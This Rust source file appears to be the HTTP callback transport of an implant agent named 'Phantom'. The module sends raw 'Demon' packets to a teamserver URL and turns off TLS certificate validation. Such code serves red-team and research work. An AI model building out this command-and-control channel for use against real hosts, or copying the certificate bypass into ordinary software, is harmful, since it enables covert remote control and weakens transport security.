//! HTTP transport for Phantom callback traffic.

use tracing::{debug, warn};

use crate::config::PhantomConfig;
use crate::error::PhantomError;

/// Stateless HTTP transport wrapper.
#[derive(Debug)]
pub struct HttpTransport {
    client: reqwest::Client,
    callback_url: String,
}

impl HttpTransport {
    /// Build a transport from the current agent configuration.
    pub fn new(config: &PhantomConfig) -> Result<Self, PhantomError> {
        let client = reqwest::Client::builder()
            .user_agent(&config.user_agent)
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|error| PhantomError::Transport(error.to_string()))?;

        Ok(Self { client, callback_url: config.callback_url.clone() })
    }

    /// POST a raw Demon transport packet and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, PhantomError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending phantom packet");

        let response = self
            .client
            .post(&self.callback_url)
            .body(packet.to_vec())
            .send()
            .await
            .map_err(|error| PhantomError::Transport(error.to_string()))?;

        let status = response.status();
        if !status.is_success() {
            warn!(%status, "teamserver returned non-success status");
            return Err(PhantomError::Transport(format!("teamserver returned HTTP {status}")));
        }

        let body =
            response.bytes().await.map_err(|error| PhantomError::Transport(error.to_string()))?;
        Ok(body.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::HttpTransport;
    use crate::config::PhantomConfig;

    #[test]
    fn transport_builds_from_default_config() {
        assert!(HttpTransport::new(&PhantomConfig::default()).is_ok());
    }
}
